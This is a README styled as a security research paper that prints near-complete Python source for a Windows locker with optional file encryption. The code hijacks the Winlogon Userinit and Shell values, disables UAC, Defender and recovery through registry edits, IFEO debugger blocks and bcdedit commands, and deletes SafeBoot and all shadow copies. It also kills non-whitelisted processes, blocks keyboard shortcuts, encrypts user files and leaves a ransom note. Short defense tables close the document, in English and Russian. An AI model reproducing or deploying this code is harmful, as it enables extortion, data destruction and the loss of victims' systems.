# 🔒 windows-locker-research 


<div align="center">

```
╔══════════════════════════════════════════════════════════════════╗
║                    SECURITY RESEARCH PAPER                        ║
║             Windows System Locking Mechanisms                     ║
╚══════════════════════════════════════════════════════════════════╝
```

[![Platform](https://img.shields.io/badge/platform-Windows-blue?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-Security%20Research-red)]()

**Author:** Vladislav Khudash (17)  
**Date:** 03.03.2026  
**Project:** WINDOWS-LOCKER-RESEARCH  

</div>

---

## ⚠️ CRITICAL RESEARCH NOTICE

<div align="center">

| | |
|---|---|
| **🔬 Purpose** | Security research on Windows system locking and persistence mechanisms |
| **🧪 Environment** | **ISOLATED VIRTUAL MACHINES ONLY** — Never run on production systems |
| **⚖️ Legal** | This research demonstrates attack vectors for defensive purposes only |
| **🔐 Warning** | This code will **LOCK** the target system until correct password is provided |
| **📚 Educational** | Understanding these techniques is essential for building robust defenses |

</div>

---

## 📖 Table of Contents

| Section | Description |
|---------|-------------|
| [1. Configuration](#1-configuration-section) | Password and encryption settings |
| [2. Imports and Initialization](#2-imports-and-initialization) | Module imports and global variables |
| [3. Registry Configuration](#3-registry-configuration) | Registry keys for system lockdown |
| [4. Utility Functions](#4-utility-functions) | cmd(), reg_set(), reg_del(), get_services() |
| [5. Privilege Escalation](#5-privilege-escalation) | get_admin() |
| [6. Encryption Functions](#6-encryption-functions) | enc(), encrypt_file(), encrypt() |
| [7. Destruction (destroy)](#7-destruction-destroy) | System restoration |
| [8. GUI Window](#8-gui-window) | window(), on_enter(), hook_all() |
| [9. Watchdog Process Killer](#9-watchdog-process-killer) | watchdog() |
| [10. Initialization (setup)](#10-initialization-setup) | System lockdown setup |
| [11. Main Entry Point](#11-main-entry-point) | init(), main() |
| [12. Defense Recommendations](#12-defense-recommendations) | Protection measures |

---

# English

## 1. Configuration Section

<details>
<summary><b>📁 Click to expand: Password and Encryption Settings</b></summary>

```python
#=================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 03.03.2026
#     PROJECT  : WINDOWS-LOCKER-RESEARCH
#     PLATFORM : WIN32
#=================================#

#
#-
#--
#---
#----
#-----
#------
# HERE IS WINLOCKER HASH SHA-256 OF PASSWORD 
# GENERATE: python -c "from hashlib import sha256;print(sha256('YOUR PASSWORD HERE'.encode()).hexdigest())"
PASSWORD = '' 

# RESPONSIBLE FOR ENCRYPTION (ENABLED IF ENCRYPTION == True ELSE DISABLED)
ENCRYPTION = False 

MSG = '''
 ##   ##   ####    ##   ##  ####      #####     ####   ###  ##  #######  ######
 ##   ##    ##     ###  ##   ##      ##   ##   ##  ##   ##  ##   ##   #   ##  ##
 ##   ##    ##     #### ##   ##      ##   ##  ##        ## ##    ## #     ##  ##
 ## # ##    ##     ## ####   ##      ##   ##  ##        ####     ####     #####
 #######    ##     ##  ###   ##   #  ##   ##  ##        ## ##    ## #     ## ##
 ### ###    ##     ##   ##   ##  ##  ##   ##   ##  ##   ##  ##   ##   #   ##  ##
 ##   ##   ####    ##   ##  #######   #####     ####   ###  ##  #######  #### ##


Your system is completely locked
Enter password to unlock it
'''
#------
#-----
#----
#---
#--
#-
#
```

**Configuration Analysis:**

| Variable | Purpose | Generation Command |
|----------|---------|-------------------|
| `PASSWORD` | SHA-256 hash of unlock password | `python -c "from hashlib import sha256;print(sha256('YOUR PASSWORD HERE'.encode()).hexdigest())"` |
| `ENCRYPTION` | Enable/disable user file encryption | `True` or `False` |
| `MSG` | ASCII art banner displayed at lock screen | Pre-defined WINLOCKER banner |

</details>

---

## 2. Imports and Initialization

<details>
<summary><b>📁 Click to expand: Module Imports and Global Variables</b></summary>

```python
import os
import winreg as reg
import tkinter as tk
from time import sleep
from ctypes import windll
from hashlib import sha256
from getpass import getuser
from threading import Thread
from sys import argv, platform
from psutil import process_iter
from mmap import mmap, ACCESS_WRITE
from shutil import move as move_file
from keyboard import block_key, add_hotkey
from subprocess import run as sp_run, DEVNULL

if platform != 'win32':
    print(f'DO NOT SUPPORT ({platform})')
    os._exit(1)

__file__ = os.path.abspath(argv[0])

if not __file__.endswith('.exe'): 
    raise RuntimeError('file should only be run as compiled executable (.exe)')

def invalid_type(name, value, valid):
    if not isinstance(value, valid):
        raise TypeError(f'({name}) must be ({valid.__name__})')
    
invalid_type('PASSWORD', PASSWORD, str)

SYSTEMDISK = os.getenv('SYSTEMDRIVE', 'C:')
if not SYSTEMDISK.endswith(os.sep): SYSTEMDISK += os.sep

try:
    USER = getuser()
except:
    USER = 'user'

PATH = os.path.join(SYSTEMDISK, 'Windows', 'System32', 'winlocker')
FILE_WINLOCKER = os.path.join(PATH, 'winlocker.exe')
FILE_FLAG = os.path.join(PATH, '_')

PATH_TEMP = os.getenv('TEMP', os.path.join(SYSTEMDISK, 'Users', USER, 'AppData', 'Local', 'Temp'))

ENCRYPTION_MAX_SIZE = 134_217_728  # 128 MB
ENCRYPTION_MARK = b'\x1bB\xcd\x1f$v\xd0\xd3'
ENCRYPTION_NONCE = 8
ENCRYPTION_NONCE_NULL = bytes(ENCRYPTION_NONCE)
ENCRYPTION_KEY = sha256(PASSWORD.encode()).digest()
ENCRYPTION_PATH = [os.path.join(SYSTEMDISK, 'Users')] 
ENCRYPTION_PATH.extend([f'{n}:\\' for n in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{n}:\\')])
(SYSTEMDISK in ENCRYPTION_PATH) and ENCRYPTION_PATH.remove(SYSTEMDISK)

WHITELIST = {
    'winlocker.exe',
    'system idle process',
    'system',
    'registry',
    'ntoskrnl.exe', 
    'smss.exe',          
    'csrss.exe',         
    'wininit.exe',        
    'services.exe',      
    'svchost.exe',       
    'sihost.exe',
    'lsass.exe',         
    'lsm.exe',           
    'fontdrvhost.exe',    
    'dwm.exe',        
    'winlogon.exe'   
}
```

**Global Variables Analysis:**

| Variable | Value | Purpose |
|----------|-------|---------|
| `PATH` | `C:\Windows\System32\winlocker` | Installation directory (hidden in System32) |
| `FILE_WINLOCKER` | `winlocker.exe` | Installed binary location |
| `FILE_FLAG` | `_` | Flag file indicating installation complete |
| `ENCRYPTION_MAX_SIZE` | 128 MB | Maximum file size for encryption |
| `ENCRYPTION_MARK` | 8-byte signature | Marks encrypted files |
| `ENCRYPTION_KEY` | SHA-256 of password | Encryption key derived from password |
| `WHITELIST` | 17 processes | Critical Windows processes that cannot be killed |

**Whitelist Analysis:**
- `winlocker.exe` — The locker itself
- `system idle process`, `system`, `registry` — Pseudo-processes
- `ntoskrnl.exe` — NT Kernel
- `smss.exe` — Session Manager Subsystem
- `csrss.exe` — Client/Server Runtime Subsystem
- `wininit.exe` — Windows Initialization
- `services.exe` — Service Control Manager
- `svchost.exe` — Service Host
- `lsass.exe` — Local Security Authority
- `dwm.exe` — Desktop Window Manager
- `winlogon.exe` — Windows Logon

</details>

---

## 3. Registry Configuration

<details>
<summary><b>📁 Click to expand: Registry Keys for System Lockdown</b></summary>

### 3.1 Core Registry Settings

```python
REG_USERINIT = {
    'key': r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 
    'name': 'Userinit', 
    'value': r'C:\Windows\system32\userinit.exe,'
}
REG_SHELL = {
    'key': r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 
    'name': 'Shell', 
    'value': 'explorer.exe'
}
REG_LUA = {
    'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 
    'name': 'EnableLUA', 
    'value': 0
}
```

### 3.2 Services to Disable

```python
REG_SERVICE = [
    {
        'key': rf'SYSTEM\CurrentControlSet\Services\{n}',
        'name': 'Start',
        'value': 2
    } for n in [
        'Winmgmt',           # WMI
        'Schedule',          # Task Scheduler
        'wuauserv',          # Windows Update
        'UsoSvc',            # Update Orchestrator
        'WaaSMedicSvc',      # Windows Update Medic
        'TrustedInstaller',  # Trusted Installer
        'BITS',              # Background Intelligent Transfer
        'WinDefend',         # Windows Defender Antivirus
        'AppIDSvc',          # Application Identity
        'SecurityHealthService',  # Security Health
        'wscsvc',            # Security Center
        'mpssvc',            # Windows Firewall
        'WSearch',           # Windows Search
        'DiagTrack',         # Diagnostics Tracking
        'WerSvc',            # Windows Error Reporting
        'WpnService',        # Push Notifications
        'TermService',       # Remote Desktop
        'RemoteRegistry',    # Remote Registry
        'WlanSvc',           # WLAN AutoConfig
        'Dhcp',              # DHCP Client
        'Dnscache',          # DNS Client
        'LanmanServer',      # Server
        'LanmanWorkstation', # Workstation
        'USBSTOR',           # USB Mass Storage
        'Spooler',           # Print Spooler
        'Audiosrv',          # Windows Audio
        'EventLog'           # Windows Event Log
    ]
]
```

### 3.3 Registry Disable Settings (Partial List)

```python
REG_DISABLE = [
    # Session Manager
    {'key': r'SYSTEM\CurrentControlSet\Control\Session Manager', 'name': 'ProtectionMode', 'value': 0},
    {'key': r'SYSTEM\CurrentControlSet\Control\Session Manager', 'name': 'RecoveryEnabled', 'value': 0},
    
    # Safe Mode
    {'key': r'SYSTEM\CurrentControlSet\Control\Session Manager', 'name': 'SafeMode', 'value': 0},
    
    # Windows RE
    {'key': r'SYSTEM\CurrentControlSet\Control\WindowsRE', 'name': 'Enabled', 'value': 0},
    
    # System Restore
    {'key': r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore', 'name': 'DisableSR', 'value': 1},
    
    # Windows Update
    {'key': r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'name': 'DisableWindowsUpdateAccess', 'value': 1},
    
    # Windows Defender
    {'key': r'SOFTWARE\Policies\Microsoft\Windows Defender', 'name': 'DisableAntiSpyware', 'value': 1},
    
    # Explorer Policies
    {'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer', 'name': 'NoDrives', 'value': 0x3ffffff},
    {'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer', 'name': 'NoRun', 'value': 1},
    {'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer', 'name': 'NoControlPanel', 'value': 1},
    
    # System Policies
    {'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 'name': 'DisableCAD', 'value': 1},
    {'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 'name': 'DisableLockWorkstation', 'value': 1},
]
```

### 3.4 Image File Execution Options (Debugger Hijack)

```python
REG_DISABLE.extend([
    {
        'key': rf'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{n}',
        'name': 'Debugger',
        'value': '" "'
    } for n in [
        'bcdedit.exe',       # Boot configuration
        'diskpart.exe',      # Disk partitioning
        'taskmgr.exe',       # Task Manager
        'cmd.exe',           # Command Prompt
        'powershell.exe',    # PowerShell
        'regedit.exe',       # Registry Editor
        'msconfig.exe',      # System Configuration
        'explorer.exe',      # Windows Explorer
        'osk.exe',           # On-Screen Keyboard
        'magnify.exe',       # Magnifier (Sticky Keys bypass)
        'utilman.exe',       # Utility Manager (Sticky Keys bypass)
    ]
])
```

**IFEO Debugger Hijack Analysis:**
- Setting `Debugger` to `" "` (space) prevents the executable from running
- Commonly used to block recovery tools and bypass methods
- Sticky Keys bypass (`sethc.exe`, `utilman.exe`, `osk.exe`, `magnify.exe`) is blocked

</details>

---

## 4. Utility Functions

<details>
<summary><b>📁 Click to expand: cmd(), reg_set(), reg_del(), get_services()</b></summary>

### 4.1 cmd() — Execute Command

```python
def cmd(c, shell=False):
    try:
        return sp_run(c, input=False, stdout=DEVNULL, stderr=DEVNULL, shell=shell).returncode
    except:
        return -1
```

### 4.2 reg_set() — Set Registry Value

```python
def reg_set(d):
    key = d['key']
    name = d['name']
    value = d['value']

    try:
        with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key, access=reg.KEY_WRITE) as k:
            reg.SetValueEx(
                k, 
                name, 
                0, 
                reg.REG_DWORD if isinstance(value, int) else reg.REG_SZ, 
                value
            )
    except:
        return
```

### 4.3 reg_del() — Delete Registry Value

```python
def reg_del(d):
    try:
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, d['key'], 0, access=reg.KEY_SET_VALUE) as k:
            reg.DeleteValue(k, d['name'])
    except:
        return
```

### 4.4 get_services() — Enumerate Non-System Services

```python
def get_services():
    service_key = r'SYSTEM\CurrentControlSet\Services'
    services = []
    i = 0
    
    try:
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, service_key) as k:
            while True:
                try:
                    name = reg.EnumKey(k, i).strip()
                    i += 1

                    if not name:
                        continue

                    try:
                        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, f'{service_key}\\{name}') as sk:
                            image_path = reg.QueryValueEx(sk, 'ImagePath')[0]

                            if 'system32' not in image_path.lower():
                                services.append(name)
                    except: 
                        continue
                except OSError:
                    break
    except: ...
        
    return services
```

### 4.5 disable_services() — Disable All Non-System Services

```python
def disable_services():
    services = get_services()

    if not services:
        return

    for n in services:
        reg_set({
            'key': rf'SYSTEM\CurrentControlSet\Services\{n}',
            'name': 'Start',
            'value': 4  # SERVICE_DISABLED
        })
```

</details>

---

## 5. Privilege Escalation

<details>
<summary><b>📁 Click to expand: get_admin()</b></summary>

### 5.1 get_admin() — UAC Bypass to Administrator

```python
def get_admin():
    if windll.shell32.IsUserAnAdmin() != 0:
        return
    
    windll.shell32.ShellExecuteW(None, 'runas', __file__, None, None, 0)
    os._exit(0)
```

</details>

---

## 6. Encryption Functions

<details>
<summary><b>📁 Click to expand: enc(), encrypt_file(), encrypt()</b></summary>

### 6.1 enc() — Stream Cipher Encryption (ChaCha20-like)

```python
def enc(handle):
    with mmap(handle, 0, access=ACCESS_WRITE) as mf:
        len_mf = len(mf)
        counter = 0
        pos = ENCRYPTION_NONCE
        nonce = mf[:ENCRYPTION_NONCE]

        if nonce == ENCRYPTION_NONCE_NULL:
            nonce = os.urandom(ENCRYPTION_NONCE)
            mf[:ENCRYPTION_NONCE] = nonce

        while pos < len_mf:
            keystream = sha256((ENCRYPTION_KEY + nonce) + counter.to_bytes(8, 'little')).digest()

            counter += 1

            for n in keystream:
                if pos >= len_mf:
                    break

                mf[pos] ^= n
                pos += 1
```

### 6.2 encrypt_file() — Encrypt Single File

```python
def encrypt_file(path, root, label):
    try:
        cmd(['takeown', '/f', path])
        cmd(['icacls', path, '/grant', 'Everyone:F']) 
        cmd(['attrib', '-r', '-s', '-h', path])

        with open(path, 'rb+') as f:
            if f.read(len(ENCRYPTION_MARK)) == ENCRYPTION_MARK:
                root.after(0, lambda n=path: label.config(text=f'{n} ok!'))
                return
        
            f.seek(0, os.SEEK_SET)
            f.write(ENCRYPTION_MARK)
            enc(f.fileno())
    except:
        root.after(0, lambda n=path: label.config(text=f'{n} no!'))
    else:
        root.after(0, lambda n=path: label.config(text=f'{n} ok!'))
```

**Encryption Process:**
1. `takeown /f` — Take ownership of file
2. `icacls /grant Everyone:F` — Grant full access
3. `attrib -r -s -h` — Remove read-only, system, hidden attributes
4. Check for `ENCRYPTION_MARK` — Skip if already encrypted
5. Write 8-byte signature
6. Encrypt using `enc()`

### 6.3 encrypt() — Recursive Directory Encryption

```python
def encrypt(root_path, tkroot, label):
    for root, _, files in os.walk(root_path):
        for n in files:
            try:
                fp = os.path.join(root, n)

                if root.startswith(PATH_TEMP) or (os.path.getsize(fp) > ENCRYPTION_MAX_SIZE):
                    continue

                encrypt_file(fp, tkroot, label)
                tkroot.update_idletasks()
            except:
                continue
```

</details>

---

## 7. Destruction (destroy)

<details>
<summary><b>📁 Click to expand: destroy()</b></summary>

```python
def destroy():
    reg_set({
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'name': 'wincleanup',
        'value': f'cmd.exe /c rmdir /q /s "{PATH}"'
    })

    cmd(['rmdir', '/q', '/s', PATH], shell=True)

    for n in [
        REG_USERINIT, 
        REG_SHELL, 
        REG_LUA
    ] + REG_SERVICE:
        reg_set(n) 

    for n in REG_DISABLE:
        reg_del(n)

    if ENCRYPTION:
        try:
            with open(os.path.join(SYSTEMDISK, 'requirement.txt'), 'w') as f:
                f.write(MSG)
        except: ...
    
    cmd(['shutdown', '/f', '/t', '0', '/r'])
    os._exit(0)
```

**System Restoration Process:**

| Step | Action | Purpose |
|------|--------|---------|
| 1 | Set `RunOnce` cleanup | Delete winlocker directory on next boot |
| 2 | Delete `PATH` directory | Remove winlocker files |
| 3 | Restore `Userinit` and `Shell` | Re-enable normal logon |
| 4 | Restore `EnableLUA` | Re-enable UAC |
| 5 | Restore service start types | Re-enable disabled services |
| 6 | Delete restrictive registry values | Remove lockdown policies |
| 7 | Create `requirement.txt` | Leave ransom note (if encryption was enabled) |
| 8 | Force reboot | Restart system |

</details>

---

## 8. GUI Window

<details>
<summary><b>📁 Click to expand: window(), on_enter(), hook_all()</b></summary>

### 8.1 on_enter() — Password Verification

```python
def on_enter(root, entry):
    password = entry.get().strip().encode()

    if sha256(password).hexdigest() == PASSWORD:
        root.quit()
        destroy()
    else:
        entry.delete(0, tk.END)
        entry.config(state='disabled')
        root.after(3000, lambda: entry.config(state='normal'))
```

### 8.2 hook_all() — Block Keyboard Shortcuts

```python
def hook_all():
    for n in [
        'esc', 'tab', 
        'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
        'windows', 'left windows', 'right windows',
        'print screen', 'scroll lock', 'pause', 
        'insert', 'home', 'page up', 'page down', 'delete', 'end',
        'caps lock', 'num lock'
    ]:
        try:
            block_key(n)
        except:
            continue
    
    for n in [
        'alt+f4', 'ctrl+alt+del', 'ctrl+shift+esc', 'alt+tab', 'ctrl+esc',
        'alt+esc', 'windows+r', 'windows+d', 'windows+e', 'windows+l',
        'windows+x', 'ctrl+alt+tab', 'alt+space'
    ]:
        try:
            add_hotkey(n, lambda: None, suppress=True)
        except:
            continue
```

**Blocked Keys and Shortcuts:**

| Category | Items |
|----------|-------|
| Function keys | F1-F12 |
| Windows keys | Windows, Left/Right Windows |
| Navigation | Esc, Tab, Home, End, PgUp, PgDn, Insert, Delete |
| Lock keys | Caps Lock, Num Lock, Scroll Lock, Pause |
| System shortcuts | Alt+F4, Ctrl+Alt+Del, Ctrl+Shift+Esc, Alt+Tab |
| Windows shortcuts | Win+R, Win+D, Win+E, Win+L, Win+X |

### 8.3 window() — Main GUI Loop

```python
def window():
    def set_window():
        root.attributes('-topmost', True)
        root.lift()
        root.focus_force()
        root.grab_set_global()
        
    def keep_focus():
        if (root.focus_get() != entry) or not root.attributes('-topmost'):
            set_window()
            entry.focus_force()
        root.after(100, keep_focus)

    def tkencrypt():
        def _start():
            for n in ENCRYPTION_PATH:
                try:
                    encrypt(n, root, path_label)
                except:
                    root.after(0, lambda n=n: path_label.config(text=f'{n} no!'))
                root.after(0, lambda: entry.focus_force())
                root.after(0, root.update_idletasks)
            root.after(0, path_label.pack_forget)
            root.after(0, lambda: entry.focus_force())

        path_label = tk.Label(frame, text='WinPE', font=FONT, **COLOR)
        path_label.pack()
        Thread(target=_start, daemon=True).start()

    root = tk.Tk()
    root.title('tty')
    root.config(background=COLOR['bg'], cursor='none')
    root.resizable(False, False)
    root.attributes('-fullscreen', True)
    root.protocol('WM_DELETE_WINDOW', lambda: None)
    root.overrideredirect(True)
    set_window()
   
    tk.Label(root, text=MSG, font=FONT, **COLOR).pack()

    frame = tk.Frame(root, bg=COLOR['bg'])
    frame.pack(padx=10, pady=10, fill='x')

    tk.Label(frame, text='PASSWORD:', font=FONT, **COLOR).pack(side='left', pady=25)
    entry = tk.Entry(frame, cursor='none', show='*', font=FONT, **COLOR, bd=0)
    entry.pack(side='left', fill='x', padx=5, expand=True)
    entry.bind('<Return>', lambda _: on_enter(root, entry))
    entry.focus_force()

    if ENCRYPTION: tkencrypt()

    root.after(100, keep_focus)
    root.mainloop()
```

**GUI Features:**
- Fullscreen, borderless window (`overrideredirect(True)`)
- Always on top (`-topmost True`)
- Global grab (`grab_set_global()`) — prevents interaction with other windows
- Hidden cursor (`cursor='none'`)
- Password masking (`show='*'`)
- 3-second cooldown on wrong password
- Focus keeper — prevents focus stealing
- Encryption progress display (if enabled)

</details>

---

## 9. Watchdog Process Killer

<details>
<summary><b>📁 Click to expand: watchdog()</b></summary>

### 9.1 watchdog() — Kill Non-Whitelisted Processes

```python
def watchdog():
    while True:
        for n in process_iter(['name']):
            try:
                proc = n.info.get('name', '').lower()

                if proc and (proc not in WHITELIST):
                    n.kill()
            except:
                continue

        sleep(1)
```

**Watchdog Logic:**
- Runs in background thread
- Iterates all running processes every second
- Kills any process not in `WHITELIST`
- Prevents users from launching Task Manager, cmd, or other tools

</details>

---

## 10. Initialization (setup)

<details>
<summary><b>📁 Click to expand: setup()</b></summary>

```python
def setup():
    if not os.path.isdir(PATH):
        os.mkdir(PATH)
    windll.kernel32.SetFileAttributesW(PATH, 0x04)  # FILE_ATTRIBUTE_SYSTEM

    if not os.path.isfile(FILE_WINLOCKER) and os.path.isfile(__file__):
        move_file(__file__, FILE_WINLOCKER)

    REG_USERINIT['value'] = FILE_WINLOCKER
    REG_SHELL['value'] = ''

    for n in [
        REG_USERINIT, 
        REG_SHELL, 
        REG_LUA, 
    ] + REG_DISABLE:
        reg_set(n)

    for n in REG_SERVICE:
        n['value'] = 4  # SERVICE_DISABLED
        reg_set(n)

    disable_services()

    for n in (
        ['bcdedit', '/timeout', '0'],
        ['bcdedit', '/set', '{bootmgr}', 'bootmenu', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'displaybootmenu', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'advancedoptions', 'off'],
        ['bcdedit', '/set', '{bootmgr}', 'bootems', 'no'],
        ['bcdedit', '/set', '{current}', 'quietboot', 'yes'],
        ['bcdedit', '/set', '{current}', 'bootmenupolicy', 'standard'],
        ['bcdedit', '/set', '{current}', 'autorecoveryenabled', 'no'],
        ['bcdedit', '/set', '{current}', 'recoveryenabled', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'nointegritychecks', 'yes'],
        ['bcdedit', '/set', '{current}', 'bootstatuspolicy', 'IgnoreAllFailures'],
        ['bcdedit', '/delete', '{dbgsettings}', '/f'],
        ['bcdedit', '/delete', '{memdiag}', '/f'],
        ['bcdedit', '/delete', '{badmemory}', '/f'],
        ['bcdedit', '/delete', '{hypervisorsettings}', '/f'],
        ['bcdedit', '/delete', '{emssettings}', '/f'],
        ['reg', 'delete', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot', '/f'],
        ['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
        ['reagentc', '/disable'],
        ['ipconfig', '/release']
    ):
        cmd(n)

    with open(FILE_FLAG, 'w') as f: ...
    cmd(['shutdown', '/f', '/t', '0', '/r'])
    os._exit(0)
```

**System Lockdown Analysis:**

| Component | Modification | Purpose |
|-----------|--------------|---------|
| **PATH** | Hidden (`FILE_ATTRIBUTE_SYSTEM`) | Hide in System32 |
| **Userinit** | Set to `winlocker.exe` | Auto-start locker on logon |
| **Shell** | Empty string | Prevent Explorer from starting |
| **EnableLUA** | `0` | Disable UAC |
| **BCD** | Disable recovery, boot menu, EMS | Prevent boot-time recovery |
| **SafeBoot** | Delete entire registry key | Disable Safe Mode |
| **VSS** | Delete all shadow copies | Prevent System Restore |
| **WinRE** | `reagentc /disable` | Disable Windows Recovery Environment |
| **Network** | `ipconfig /release` | Release DHCP lease |
| **Services** | All non-system → Disabled | Prevent service-based recovery |

**BCD Modifications:**

| Command | Effect |
|---------|--------|
| `/timeout 0` | No boot menu delay |
| `/set {bootmgr} bootmenu no` | Disable boot menu |
| `/set {bootmgr} advancedoptions off` | Disable F8 Advanced Options |
| `/set {current} recoveryenabled no` | Disable automatic recovery |
| `/set {current} autorecoveryenabled no` | Disable auto recovery |
| `/delete {dbgsettings}` | Remove debug settings |
| `/delete {memdiag}` | Remove memory diagnostic |
| `/delete {badmemory}` | Remove bad memory list |
| `/delete {hypervisorsettings}` | Remove hypervisor settings |

</details>

---

## 11. Main Entry Point

<details>
<summary><b>📁 Click to expand: init(), main()</b></summary>

### 11.1 init() — Initialization

```python
def init():
    invalid_type('ENCRYPTION', ENCRYPTION, bool)
    invalid_type('MSG', MSG, str)

    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')

    if windll.kernel32.IsDebuggerPresent():
        windll.user32.BlockInput(True)
        os._exit(0)

    get_admin()

    if not os.path.isfile(FILE_FLAG):
        windll.user32.BlockInput(True)
        setup()
    else:
        Thread(target=watchdog, daemon=False).start()
        windll.user32.ShowCursor(False)
        hook_all()
```

**Initialization Flow:**
1. Validate configuration
2. Check for debugger — if present, block input and exit
3. Elevate to administrator (`get_admin()`)
4. If not installed (`FILE_FLAG` missing) → block input and run `setup()`
5. If installed → start watchdog, hide cursor, hook keyboard

### 11.2 main() — Main Loop

```python
def main():
    init()

    while True:
        try:
            window()
        except:
            sleep(0.1)
    
if __name__ == '__main__': main()
```

</details>

---

## 12. Defense Recommendations

### 12.1 Boot Chain Protection

| Measure | Implementation |
|---------|----------------|
| **Secure Boot** | Enable UEFI Secure Boot |
| **BitLocker** | Enable TPM + PIN for pre-boot authentication |
| **BCD Integrity** | Monitor BCD changes, backup BCD store |
| **Disable BCD Edit from OS** | Set `bcdedit /set {current} recoveryenabled No` only via WinPE |

### 12.2 Runtime Protection

| Measure | Implementation |
|---------|----------------|
| **Windows Defender Credential Guard** | Isolate LSASS |
| **Controlled Folder Access** | Protect System32 and registry hives |
| **Attack Surface Reduction (ASR)** | Block process creation from unexpected locations |
| **AppLocker / WDAC** | Restrict executable paths |
| **Monitor IFEO Keys** | Alert on `Debugger` value creation |

### 12.3 Registry Protection

| Measure | Implementation |
|---------|----------------|
| **Audit Registry Access** | Log changes to `Winlogon`, `Policies\System` |
| **Backup Critical Keys** | Regular backup of `Userinit`, `Shell`, `EnableLUA` |
| **Restrict `reg.exe`** | Remove from PATH or restrict via AppLocker |

### 12.4 Recovery Preparation

| Measure | Implementation |
|---------|----------------|
| **Windows RE USB** | Keep bootable Windows RE USB for recovery |
| **Offline Registry Editor** | Know how to edit registry from WinPE |
| **Backup BCD** | `bcdedit /export C:\bcd_backup` |
| **System Restore Points** | Keep recent restore points (if not disabled) |

### 12.5 Detection & Response

| Measure | Implementation |
|---------|----------------|
| **EDR/XDR** | Detect process creation in System32 with suspicious names |
| **Sysmon** | Monitor registry changes to `Winlogon` and `Image File Execution Options` |
| **Windows Event Forwarding** | Centralize logs to SIEM |
| **Anomaly Detection** | Alert on `Userinit` or `Shell` modification |

---

# Русский

## 1. Аннотация исследования

Данное исследование изучает **механизмы блокировки Windows систем** через модификацию реестра, BCD, служб и пользовательского интерфейса.

| Компонент | Модификация |
|-----------|-------------|
| **Реестр** | `Userinit` → winlocker.exe, `Shell` → пусто, `EnableLUA` → 0 |
| **BCD** | Отключение recovery, boot menu, Safe Mode |
| **Службы** | Отключение всех не-системных служб |
| **IFEO** | Блокировка `cmd.exe`, `powershell.exe`, `taskmgr.exe` |
| **GUI** | Полноэкранное окно, захват клавиатуры, блокировка горячих клавиш |
| **Watchdog** | Убийство всех процессов не из белого списка |

---

## 2. Белый список процессов

| Процесс | Назначение |
|---------|------------|
| `winlocker.exe` | Сам локер |
| `system idle process` | Псевдо-процесс |
| `system`, `registry` | Псевдо-процессы |
| `ntoskrnl.exe` | Ядро NT |
| `smss.exe` | Session Manager |
| `csrss.exe` | Client/Server Runtime |
| `wininit.exe` | Windows Initialization |
| `services.exe` | Service Control Manager |
| `svchost.exe` | Service Host |
| `lsass.exe` | Local Security Authority |
| `dwm.exe` | Desktop Window Manager |
| `winlogon.exe` | Windows Logon |

---

## 3. Заблокированные клавиши и сочетания

| Категория | Элементы |
|-----------|----------|
| Функциональные клавиши | F1-F12 |
| Клавиши Windows | Windows, Left/Right Windows |
| Навигация | Esc, Tab, Home, End, PgUp, PgDn |
| Системные сочетания | Alt+F4, Ctrl+Alt+Del, Ctrl+Shift+Esc, Alt+Tab |
| Windows сочетания | Win+R, Win+D, Win+E, Win+L, Win+X |

---

## 4. Модификации BCD

| Команда | Эффект |
|---------|--------|
| `/timeout 0` | Нет задержки меню загрузки |
| `/set {bootmgr} bootmenu no` | Отключить меню загрузки |
| `/set {bootmgr} advancedoptions off` | Отключить F8 Advanced Options |
| `/set {current} recoveryenabled no` | Отключить автоматическое восстановление |
| `/delete {dbgsettings}` | Удалить настройки отладки |
| `/delete {memdiag}` | Удалить диагностику памяти |
| `/delete {safeboot}` | Удалить параметры Safe Mode |

---

## 5. Рекомендации по защите

### 5.1 Защита цепочки загрузки

| Мера | Реализация |
|------|------------|
| **Secure Boot** | Включить UEFI Secure Boot |
| **BitLocker** | TPM + PIN для pre-boot аутентификации |
| **Целостность BCD** | Мониторинг изменений BCD |

### 5.2 Защита реестра

| Мера | Реализация |
|------|------------|
| **Аудит доступа к реестру** | Логирование изменений `Winlogon`, `Policies\System` |
| **Резервное копирование** | Регулярный бэкап `Userinit`, `Shell`, `EnableLUA` |
| **Мониторинг IFEO** | Оповещение при создании ключей `Debugger` |

### 5.3 Подготовка к восстановлению

| Мера | Реализация |
|------|------------|
| **Windows RE USB** | Держать загрузочную Windows RE USB |
| **Офлайн редактор реестра** | Уметь редактировать реестр из WinPE |
| **Резервная копия BCD** | `bcdedit /export C:\bcd_backup` |

---

<div align="center">

**[⬆ Back to Top](#-windows-locker-research-complete-technical-analysis)**

*Security Research — Windows System Locking Mechanisms*

</div>
